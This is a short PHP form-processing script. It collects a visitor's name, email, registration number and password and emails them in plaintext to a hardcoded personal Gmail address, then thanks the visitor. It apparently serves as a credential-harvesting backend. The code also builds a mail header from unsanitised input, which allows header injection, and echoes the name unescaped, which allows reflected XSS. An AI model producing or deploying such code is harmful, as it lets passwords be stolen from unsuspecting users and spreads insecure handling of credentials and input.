<?php
if(isset($_POST['submit1'])){
	$name = $_POST['name'];
	$email = $_POST['email'];
	$reg = $_POST['reg'];
	$pwd = $_POST['pw'];

	$to = 'sreyanbiswas05@gmail.com';
	$subject = 'Form Submission';
	$message = "Name: ".$name."\n"."REG: ".$reg."\n"."PWD: ".$pwd;
	$headers="From: ".$email;

	if(mail($to, $subject, $message, $headers)){
		echo"<h1>sent Successfully! Thank You"." ".$name.",We will contact you shortly</h1>";
	}
	else{
		echo "something went wrong";
	}
}
?>